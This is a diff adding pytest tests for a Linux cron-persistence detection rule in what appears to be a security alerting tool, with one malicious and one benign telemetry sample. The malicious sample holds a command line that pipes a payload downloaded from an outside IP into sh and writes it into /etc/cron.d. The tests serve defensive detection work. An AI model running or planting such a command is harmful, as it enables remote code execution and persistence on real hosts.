@@ -694,3 +694,78 @@ def test_malware_001_benign_execution_does_not_trigger(tmp_path):
     assert document["detection_id"] == "NONE"
     assert document["alerts"] == []
     assert document["alert_count"] == 0
+
+
+def test_linux_001_cron_persistence_detection(tmp_path):
+    telemetry = tmp_path / "linux-cron.jsonl"
+
+    telemetry.write_text(
+        '{"event_id":"EVT-009001","timestamp":"2026-09-09T13:00:00Z",'
+        '"event_type":"linux_persistence","source":"linux_audit",'
+        '"host":"lab-linux-02","user":"analyst","action":"cron_modify",'
+        '"status":"success","process":"bash",'
+        '"command_line":"curl http://203.0.113.80/payload.sh | sh '
+        '>> /etc/cron.d/system-update",'
+        '"file_path":"/etc/cron.d/system-update",'
+        '"metadata":{"hidden_payload":true,"environment":"lab"}}\n',
+        encoding="utf-8",
+    )
+
+    output = tmp_path / "alert.json"
+
+    document = run_detection(
+        "DET-LINUX-001",
+        telemetry,
+        output,
+    )
+
+    assert document["detection_id"] == "DET-LINUX-001"
+    assert document["alert_count"] == 1
+
+    alert = document["alerts"][0]
+
+    assert alert["alert_id"] == "ALERT-CASE-009-DET-LINUX-001-EVT-009001"
+    assert alert["severity"] == "high"
+    assert alert["confidence"] == "high"
+    assert alert["host"] == "lab-linux-02"
+    assert alert["user"] == "analyst"
+    assert alert["process"] == "bash"
+    assert alert["file_path"] == "/etc/cron.d/system-update"
+    assert alert["indicator_count"] == 3
+    assert "cron_persistence_path" in alert["indicators"]
+    assert "shell_download_execution" in alert["indicators"]
+    assert "hidden_or_tmp_payload" in alert["indicators"]
+    assert alert["supporting_event_ids"] == ["EVT-009001"]
+
+    assert alert["mitre_attack"] == {
+        "tactic": "persistence",
+        "technique": "T1053.003",
+        "name": "Cron",
+    }
+
+
+def test_linux_001_legitimate_cron_activity_does_not_trigger(tmp_path):
+    telemetry = tmp_path / "linux-cron-benign.jsonl"
+
+    telemetry.write_text(
+        '{"event_id":"EVT-009002","timestamp":"2026-09-09T13:01:00Z",'
+        '"event_type":"linux_persistence","source":"linux_audit",'
+        '"host":"lab-linux-02","user":"admin","action":"cron_modify",'
+        '"status":"success","process":"crontab",'
+        '"command_line":"crontab -e",'
+        '"file_path":"/var/spool/cron/crontabs/admin",'
+        '"metadata":{"hidden_payload":false,"environment":"lab"}}\n',
+        encoding="utf-8",
+    )
+
+    output = tmp_path / "alert.json"
+
+    document = run_detection(
+        "DET-LINUX-001",
+        telemetry,
+        output,
+    )
+
+    assert document["detection_id"] == "NONE"
+    assert document["alerts"] == []
+    assert document["alert_count"] == 0
